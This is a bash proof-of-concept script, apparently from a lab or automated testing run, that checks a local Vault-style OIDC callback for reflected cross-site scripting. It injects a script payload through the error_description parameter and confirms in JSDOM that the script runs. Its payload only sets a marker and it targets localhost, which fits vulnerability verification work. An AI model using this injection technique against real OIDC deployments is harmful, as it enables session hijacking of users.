#!/usr/bin/env bash
set -euo pipefail

base='http://127.0.0.1:8200'
callback="$base/v1/auth/oidc/oidc/callback"
redirect='http://127.0.0.1:8200/ui/vault/auth/oidc/oidc/callback'
run_dir="$(mktemp -d /home/playground/output/attempt_1/playground/run.XXXXXX)"
mkdir -p "$run_dir"

get_state() {
  local nonce="$1"
  local out="$2"
  curl -fsS --max-time 10 -X POST "$base/v1/auth/oidc/oidc/auth_url" \
    -H 'Content-Type: application/json' \
    --data "{\"role\":\"lab-direct\",\"redirect_uri\":\"$redirect\",\"client_nonce\":\"$nonce\"}" \
    -D "$out.headers" -o "$out.body" --trace-ascii "$out.trace"
  jq -e -r '.data.state // empty' "$out.body"
}

benign='BENIGN_MARKER'
benign_state="$(get_state 'poc-benign-nonce' "$run_dir/benign-auth")"
curl -sS --max-time 10 -G "$callback" \
  --data-urlencode "state=$benign_state" \
  --data-urlencode "error_description=$benign" \
  -D "$run_dir/benign-callback.headers" -o "$run_dir/benign-callback.body" \
  --trace-ascii "$run_dir/benign-callback.trace"

payload='<script>document.body.setAttribute("data-xss","XSS_MARKER")</script>'
malicious_state="$(get_state 'poc-malicious-nonce' "$run_dir/malicious-auth")"
curl -sS --max-time 10 -G "$callback" \
  --data-urlencode "state=$malicious_state" \
  --data-urlencode "error_description=$payload" \
  -D "$run_dir/malicious-callback.headers" -o "$run_dir/malicious-callback.body" \
  --trace-ascii "$run_dir/malicious-callback.trace"

printf 'run_dir=%s\n' "$run_dir"
printf 'benign_state=%s\n' "$benign_state"
printf 'malicious_state=%s\n' "$malicious_state"
printf 'malicious_body_bytes=%s\n' "$(wc -c < "$run_dir/malicious-callback.body")"
printf 'payload_occurrences=%s\n' "$(grep -F -o "$payload" "$run_dir/malicious-callback.body" | wc -l)"

node - "$run_dir/malicious-callback.body" <<'NODE'
const fs = require('fs');
const { JSDOM } = require('jsdom');
const html = fs.readFileSync(process.argv[2], 'utf8');
const dom = new JSDOM(html, { runScripts: 'dangerously' });
console.log('body_data_xss=' + (dom.window.document.body.getAttribute('data-xss') || ''));
NODE
